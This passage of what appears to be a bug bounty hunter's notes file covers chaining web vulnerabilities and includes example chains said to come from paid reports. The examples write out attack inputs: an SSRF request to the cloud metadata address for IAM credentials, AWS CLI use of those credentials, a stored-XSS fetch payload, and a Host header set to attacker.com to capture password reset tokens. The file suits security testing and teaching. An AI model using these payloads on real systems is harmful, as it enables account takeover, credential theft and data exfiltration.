    - P2: SSRF callback (High — chains to Critical)
    - P3: Open redirect (Medium — chains to Critical)
    - P4: Missing CSP (Low — chains if XSS found)
    - P5: Self-XSS candidate (Low — chains if CSRF found)
  
  Chain Priority:
    P2 -> Cloud Metadata (Critical, high effort)
    P1 -> Admin Stored XSS (Critical, medium effort)
    P3 -> OAuth -> ATO (Critical, unknown if OAuth exists)
    P5 -> CSRF -> Stored XSS (High, low effort)
    P4 + any XSS (amplifier, not standalone)

BOOZT.COM:
  Primitives Available:
    - P1: Registration disabled (blocker, not a primitive)
  
  Chain Priority:
    Need: Test credentials or invite abuse path
    After accounts: Full hunting methodology
```

---

## 13. Chain Testing Methodology

### 13.1 How to Test a Chain

```
0. Prerequisites: Both primitives must be independently confirmed

1. Design the chain
   - Write step-by-step: what happens at each stage
   - Identify any prerequisites (user interaction, timing, etc.)

2. Test each step independently
   - Step 1: [Primitive A] — confirm it works
   - Step 2: [Connection between A and B] — confirm the connection
   - Step 3: [Primitive B] — confirm it works in the chain context
   - Step 4: [Impact] — confirm the final impact

3. Test the full chain
   - Run through all steps end-to-end
   - Document what an external attacker would need

4. Validate the chain
   - Reproduce 3x from clean state
   - Test with different accounts/users
   - Ensure reproducibility is reliable

5. Evidence collection
   - Capture each step with screenshots
   - Show the connection between primitives clearly
   - The chain is the finding — not the individual pieces

6. Reporting
   - Report as a single finding
   - Title: "[Primitive A] in [Feature] chained with [Primitive B] in [Feature] to achieve [Impact]"
   - Explain both primitives and how they connect
   - CVSS should reflect the chained impact, not the individual components
```

### 13.2 Chain Testing Tools

| Tool | Use Case | Example |
|------|----------|---------|
| Burp Repeater | Test each primitive individually | Save each step as a separate tab |
| Burp Proxy | Capture the full chain sequence | Filter by target, order by time |
| Burp Intruder | Brute-force token values in chain | Pitchfork for multi-parameter |
| Turbo Intruder | Race condition primitives | 20 concurrent requests |
| Python asyncio | Automate multi-step chains | Chain A -> B -> C with Python |
| PowerShell | Quick chain component testing | Test-Endpoint, Test-IDOR |
| curl | Simple chain component testing | Each step as a separate request |

### 13.3 Chain Complexity Classification

| Classification | Primitives | Steps | Time to Build | Example |
|---------------|------------|-------|---------------|---------|
| Simple | 2 | 2-3 | 15-30 min | IDOR read + IDOR write = ATO |
| Medium | 2 | 3-5 | 30-60 min | OR + OAuth = ATO |
| Complex | 3+ | 5-10 | 1-3 hours | SSRF + Cloud Metadata + Cloud Enumeration |
| Advanced | 3+ with conditional | 10+ | 3-8 hours | Multi-hop SSRF through internal services |

---

## 14. Cross-Target Primitive Transfers

Sometimes a primitive found on one target can be applied to another:

| Primitive | Found On | Also Apply To | Reason |
|-----------|----------|---------------|--------|
| JWT alg:none | coinmarketcap.sandbox | Any target using same JWT library | If the library accepts alg:none, it's likely an implementation flaw, not environment-specific |
| Open redirect with path param | coinmarketcap.sandbox | Any app with redirect endpoint | Open redirect is often a copy-paste pattern |
| SSRF in avatar URL fetch | coinmarketcap.sandbox | Any app with avatar from URL | Common anti-pattern |

---

## 15. Chain Quick Reference

### Chain Cheat Sheet

```
PRIMITIVE LEVELS:

Level 1 — Always N/A alone:
  Open redirect, Missing CSP, Missing HSTS, Missing XFO, Self-XSS, 
  GraphQL introspection, Username enumeration, Non-critical rate limit,
  Logout CSRF, Missing SPF/DMARC, Internal IP disclosure

Level 2 — Sometimes standalone, better chained:
  Reflected XSS (Medium standalone, High chained)
  CSRF (Medium standalone, High/Critical chained)
  IDOR read (Medium/High standalone, Critical chained with IDOR write)

Level 3 — Usually standalone (High/Critical):
  Stored XSS hitting admins, SSRF with data, SQLi with data,
  IDOR write, Auth bypass, RCE, JWT attacks

BEST CHAINS BY TIME INVESTMENT:

15 min chains (highest hourly rate):
  - Mass assignment + admin role = admin access (Critical)
  - IDOR read + IDOR write = ATO (Critical)
  - Host header + password reset = ATO (Critical)
  
60 min chains:
  - OR + OAuth = ATO (Critical)
  - SSRF + cloud metadata = cloud access (Critical)
  - Rate limit + OTP = MFA bypass (High)
  
2+ hour chains:
  - SSRF + internal service discovery + exploitation = RCE (Critical)
  - JWT + admin panel + stored XSS = admin ATO (Critical)
  - Multiple SSRF hops through internal network (Critical)

CHAIN REPORTING:
  - Report as ONE finding, not separate primitives
  - Title: "[Primitive A] chained with [Primitive B] to achieve [Impact]"
  - CVSS reflects chained impact only
  - Include all evidence showing the full chain
  - The chain is the finding, not the pieces
```

---

## Chain Registry Admin

- **Last Updated:** [YYYY-MM-DD]
- **Active Primitives:** 5
- **Active Investigations:** 3
- **Completed Chains:** 0
- **Failed Chains:** 1
- **Chain Ideas:** 8

## 12. Real-World Chain Examples from Paid Reports

### 12.1 SSRF -> Cloud Metadata -> IAM Credentials -> Cloud Console Access

**Target:** Large SaaS company with custom avatar upload feature
**Chain:**
1. POST /api/avatar with `url` parameter (SSRF primitive)
2. Send `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`
3. Server returns AWS IAM temporary credentials
4. Use credentials with AWS CLI: `aws sts get-caller-identity` confirms valid
5. Use IAM credentials to enumerate S3 buckets: `aws s3 ls`
6. Found S3 bucket with customer PII (15M records)
7. Escalate to AWS Console access via `aws iam list-roles` and `aws sts assume-role`
**Severity:** Critical
**Payout range:** $5,000 - $15,000

### 12.2 IDOR -> Password Reset -> ATO

**Target:** E-commerce platform with multi-tenant architecture
**Chain:**
1. POST /api/password-reset with `email=victim@target.com` (sends reset link)
2. GET /api/v2/reset-tokens/{token} returns token validation response
3. Fuzzed token parameter found token enumeration: sequential 32-char hex tokens
4. Iterated through recent tokens to find a valid victim token before they use it
5. Used token: POST /api/reset-password with `token={stolen_token}&password=newpass`
6. Login as victim with `email=victim@target.com, password=newpass`
**Key lesson:** Token enumeration in reset flow is extremely high impact
**Severity:** Critical
**Payout range:** $3,000 - $10,000

### 12.3 XSS -> CSRF -> Account Settings Change -> Persistent XSS -> ATO

**Target:** CRM platform with rich text editor
**Chain:**
1. Stored XSS in profile "bio" field: `<script>fetch('/api/user/settings')</script>`
2. XSS fires on every profile view, including admin profile views
3. Attacker creates a victim account with XSS in bio
4. When admin views victim profile, XSS executes in admin's session
5. XSS payload: Fetch admin's CSRF token from page, then PATCH `/api/admin/users` to create new admin user controlled by attacker
6. Login as newly created admin user
**Key lesson:** Stored XSS + CSRF = privilege escalation chain
**Severity:** High - Critical
**Payout range:** $2,000 - $7,500

### 12.4 OAuth Account Linking CSRF -> ATO

**Target:** Social media platform with Google OAuth login
**Chain:**
1. Discovered OAuth account linking endpoint: POST /api/account/link-oauth
2. Endpoint accepts `provider` and `code` parameters without CSRF token
3. No `state` parameter validation on OAuth callback
4. Craft CSRF page that triggers victim's browser to:
   a. Login to their social media account (authenticated session)
   b. Visit attacker's crafted page that POSTs to /api/account/link-oauth
   c. POST includes attacker's Google OAuth code (already obtained)
5. Victim's account now has attacker's Google account linked as login method
6. Attacker logs in via Google -> enters victim's account
**Key lesson:** OAuth linking endpoints need CSRF protection AND state parameter validation
**Severity:** High
**Payout range:** $1,500 - $5,000

### 12.5 Password Reset Host Header Injection -> Token Leak -> ATO

**Target:** Fintech app with custom password reset flow
**Chain:**
1. POST /api/forgot-password with `email=victim@target.com` and `Host: attacker.com`
2. Server generates reset token and embeds it in the reset link
3. Reset link construction: `http://{Host}/reset?token={actual_reset_token}`
4. Email sent to victim with link pointing to `http://attacker.com/reset?token=abc123`
5. If victim clicks link (or if email auto-loads images), token arrives at attacker's server
6. Variant: If email does not render external content, attacker can still win by:
   a. Sending GET /reset?token=stolen_token
   b. Server returns password reset form
   c. Post new password without knowing original
**Key lesson:** Host header injection into password reset links is a common and critical flaw
**Severity:** Critical
**Payout range:** $2,000 - $7,500

### 12.6 SSRF -> IMDSv1 -> AWS Credentials -> S3 Data Exfil -> Second S3 Bucket

**Target:** Cloud-native startup with file processing service
**Chain:**
1. File processing endpoint accepts URL to download files from
2. URL parameter not validated for internal IPs (SSRF)
3. Found cloud environment: target returns `server: AmazonS3` headers
4. SSRF to AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
5. Retrieved IAM role name: `ecs-service-role-prod`
6. Retrieved full IAM credentials (AccessKeyId, SecretAccessKey, Token)
7. AWS CLI: `aws s3 ls` discovered 12 S3 buckets
8. One bucket contained application backups with database credentials
9. Used DB credentials to connect to RDS instance
10. Dumped user credentials table -> ATO chain
**Key lesson:** SSRF in cloud environments is the gift that keeps on giving — never stop after the first bucket
**Severity:** Critical
**Payout range:** $10,000 - $25,000

### 12.7 Subdomain Takeover -> OAuth Redirect URI -> Auth Code Theft -> ATO

**Target:** Major tech company with multiple subdomains
**Chain:**
1. Recon discovered `staging.app.target.com` with CNAME to unclaimed S3 bucket
2. Claimed the S3 bucket, hosted a static page
3. The static page redirects to: `https://app.target.com/oauth/callback?code={attacker_code}`
4. Login page uses OAuth with `redirect_uri=https://staging.app.target.com/oauth/callback`
5. User clicks "Login with Google" on main app
6. OAuth flow redirects to attacker's page with auth code
7. Attacker intercepts redirect and captures auth code
8. Exchanges auth code for access token -> enters victim's account
**Key lesson:** Subdomain takeover on an OAuth redirect_uri is critical due to auth code theft
**Severity:** Critical
**Payout range:** $2,000 - $10,000

### Maintenance Tasks
- [ ] Add new primitives immediately when discovered
- [ ] Update investigation status after each session
- [ ] Review chain ideas monthly for new candidate targets
- [ ] Study external chain examples (one per week recommended)
- [ ] Retest failed chains when target changes (new features, scope changes)
- [ ] Update payout estimates based on actual results
- [ ] Archive completed chain investigations
- [ ] Cross-reference primitives with newly disclosed bug bounty reports

---

*Chain thinking is a force multiplier. One primitive is a Medium. A primitive + a chain = Critical.*

*End of chain-primitives.md*
